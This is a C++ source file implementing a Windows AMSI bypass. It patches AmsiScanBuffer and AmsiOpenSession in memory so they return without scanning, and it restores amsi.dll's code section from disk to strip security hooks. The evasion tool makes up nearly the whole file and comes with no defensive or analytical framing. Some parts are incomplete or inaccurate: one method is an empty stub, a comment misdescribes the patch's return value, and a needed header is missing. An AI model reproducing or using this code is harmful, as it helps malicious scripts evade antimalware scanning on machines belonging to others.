#include <windows.h>
#include <stdio.h>

// AMSI bypass using memory patching
class AMSIBypass {
public:
    static bool PatchAMSI() {
        HMODULE hAmsi = LoadLibraryA("amsi.dll");
        if (!hAmsi) return false;
        
        // Method 1: Patch AmsiScanBuffer
        LPVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (!pAmsiScanBuffer) return false;
        
        // x64 patch: mov eax, 0x80070057 (E_INVALIDARG); ret
        // This makes AMSI think the scan was successful but found nothing
        BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        
        DWORD oldProtect;
        if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            return false;
        }
        
        memcpy(pAmsiScanBuffer, patch, sizeof(patch));
        VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
        
        // Method 2: Patch AmsiOpenSession
        LPVOID pAmsiOpenSession = GetProcAddress(hAmsi, "AmsiOpenSession");
        if (pAmsiOpenSession) {
            BYTE openPatch[] = { 0x48, 0x31, 0xC0, 0xC3 }; // xor rax, rax; ret
            VirtualProtect(pAmsiOpenSession, sizeof(openPatch), PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(pAmsiOpenSession, openPatch, sizeof(openPatch));
            VirtualProtect(pAmsiOpenSession, sizeof(openPatch), oldProtect, &oldProtect);
        }
        
        // Method 3: Patch amsiInitFailed (PowerShell specific)
        // This is a global variable that indicates AMSI initialization failed
        HMODULE hAmsiPS = GetModuleHandleA("amsi.dll");
        if (hAmsiPS) {
            // Find .data section and patch amsiInitFailed
            // Implementation would parse PE headers
        }
        
        return true;
    }
    
    static bool UnhookAMSI() {
        // Restore AMSI DLL from disk to remove hooks
        wchar_t amsiPath[MAX_PATH];
        GetSystemDirectoryW(amsiPath, MAX_PATH);
        wcscat(amsiPath, L"\\amsi.dll");
        
        // Read clean copy from disk
        HANDLE hFile = CreateFileW(amsiPath, GENERIC_READ, FILE_SHARE_READ, NULL, 
                                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return false;
        
        DWORD fileSize = GetFileSize(hFile, NULL);
        std::vector<BYTE> cleanDll(fileSize);
        DWORD read;
        ReadFile(hFile, cleanDll.data(), fileSize, &read, NULL);
        CloseHandle(hFile);
        
        // Parse PE and find .text section
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)cleanDll.data();
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(cleanDll.data() + dosHeader->e_lfanew);
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
        
        // Find loaded AMSI
        HMODULE hLoadedAmsi = GetModuleHandleA("amsi.dll");
        
        // Copy clean .text over hooked version
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (memcmp(section[i].Name, ".text", 5) == 0) {
                LPVOID loadedText = (LPVOID)((DWORD_PTR)hLoadedAmsi + section[i].VirtualAddress);
                LPVOID cleanText = (LPVOID)(cleanDll.data() + section[i].PointerToRawData);
                
                DWORD oldProtect;
                VirtualProtect(loadedText, section[i].Misc.VirtualSize, 
                              PAGE_EXECUTE_READWRITE, &oldProtect);
                memcpy(loadedText, cleanText, section[i].Misc.VirtualSize);
                VirtualProtect(loadedText, section[i].Misc.VirtualSize, oldProtect, &oldProtect);
                
                break;
            }
        }
        
        return true;
    }
};